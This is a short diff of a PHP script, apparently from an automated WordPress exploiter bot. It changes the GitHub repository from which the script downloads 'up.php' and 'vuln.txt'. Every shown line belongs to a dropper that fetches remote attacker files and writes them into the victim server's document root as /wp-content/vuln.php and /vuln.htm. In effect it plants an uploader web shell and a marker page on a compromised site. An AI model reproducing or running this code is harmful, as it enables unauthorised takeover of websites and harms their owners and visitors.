@@ -10,7 +10,7 @@ function http_get($url){
 	curl_close($im);
 }
 $check = $_SERVER['DOCUMENT_ROOT'] . "/wp-content/vuln.php" ;
-$text = http_get('https://raw.githubusercontent.com/04x/ICG-AutoExploiterBoT/master/files/up.php');
+$text = http_get('https://raw.githubusercontent.com/aztugeas/Bot/master/files/up.php');
 $open = fopen($check, 'w');
 fwrite($open, $text);
 fclose($open);
@@ -21,7 +21,7 @@ if(file_exists($check)){
 echo "done .\n " ;
 
 $check2 = $_SERVER['DOCUMENT_ROOT'] . "/vuln.htm" ;
-$text2 = http_get('https://raw.githubusercontent.com/04x/ICG-AutoExploiterBoT/master/files/vuln.txt');
+$text2 = http_get('https://raw.githubusercontent.com/aztugeas/Bot/master/files/vuln.txt');
 $open2 = fopen($check2, 'w');
 fwrite($open2, $text2);
 fclose($open2);
